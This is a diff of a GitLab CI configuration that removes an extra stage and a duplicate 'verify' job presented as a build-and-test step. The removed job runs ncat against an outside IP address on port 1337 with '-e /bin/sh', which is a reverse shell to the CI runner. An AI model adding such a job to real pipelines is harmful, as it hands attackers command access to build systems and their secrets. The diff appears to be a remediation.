@@ -34,7 +34,6 @@ services:
     command: ["--experimental"]    # Enable experimental features in Docker server
 
 stages:
-  - first
   - build
   - documentation
   - pages
@@ -74,14 +73,6 @@ verify:
   except:
     - $CI_COMMIT_TAG  
   allow_failure: false
-
-# This section describes what shall be done to build and test the project.
-verify:
-  tags:
-    - docker-build
-  stage: first
-  script:
-    - docker run itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh while{}
 
 documentation:
   tags:
